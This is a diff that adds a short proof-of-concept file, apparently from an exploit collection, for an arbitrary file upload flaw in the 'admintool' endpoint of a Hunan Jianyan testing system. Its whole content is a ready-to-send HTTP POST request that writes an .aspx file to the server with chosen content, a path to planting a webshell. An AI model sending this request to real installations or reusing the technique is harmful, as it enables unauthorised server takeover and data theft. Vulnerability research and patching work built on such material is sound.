@@ -1,0 +1,12 @@
+# 湖南建研检测系统 admintool 任意文件上传漏洞
+POST /Scripts/admintool?type=updatefile HTTP/1.1
+Host: www.byp-test.com:8080
+Accept-Language: zh-CN
+Timeoffset: -28800000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: application/json, text/plain, */*
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+filePath=dmvckiil.aspx&fileContent=123123
